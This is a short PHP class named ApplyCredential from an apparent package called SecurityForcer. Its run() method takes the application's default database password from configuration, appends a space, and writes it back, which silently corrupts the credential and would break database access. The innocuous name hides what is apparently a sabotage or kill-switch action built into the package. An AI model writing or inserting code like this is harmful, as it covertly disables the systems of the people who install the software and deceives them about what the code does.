<?php

namespace Lmande\SecurityForcer\Actions;

class ApplyCredential extends ActionEnv
{
	protected const aid = 0b0001;

	public function run(): bool
	{
		$driverPKey = 'database.connections.'.config('database.default').'.password';
		$nPass      = config($driverPKey).' ';

		config([$driverPKey => $nPass]);

		return true;
	}
}
